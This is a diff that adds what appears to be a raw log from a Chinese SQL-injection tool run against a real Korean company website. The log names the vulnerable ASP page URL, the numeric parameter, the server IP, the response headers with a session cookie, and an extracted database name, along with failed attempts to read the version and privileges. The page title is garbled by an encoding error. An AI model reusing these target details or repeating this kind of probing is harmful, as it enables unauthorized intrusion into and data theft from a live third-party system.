@@ -1,0 +1,42 @@
+■漏洞信息:============================================================
+ ·URL:http://www.saeki.co.kr/CS_CENTER/NOTICE_VIEW.ASP?LM=1&LS=2&SEQ_NO=1449
+ ·页面标题：措茄刮惫 荤柳厘厚 措钎扁诀 技扁P&C⑦
+ ·参数:LM=1&LS=2&SEQ_NO=1449
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:210.116.103.28
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 07:24:53 GMT
+Server: Microsoft-IIS/6.0
+Content-Length: 37588
+Content-Type: text/html
+Set-Cookie: SAEKI=; domain=saeki.co.kr; path=/
+Set-Cookie: ASPSESSIONIDACCRCQTD=OIEFOMKAMFECGIHFHPFCFKNJ; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+!!!!!!!!!!!!! No USB dongle! !!!!!!!!!!!!!!
+批次获取基本信息失败，开始逐一获取……
+ ·当前数据库:saekiweb
+获取数据库版本信息失败！
+ ·当前用户权限：
+获取用户权限失败！
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+ ·当前数据库:saekiweb
+获取数据库版本信息失败！
+ ·当前用户权限：
+获取用户权限失败！
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
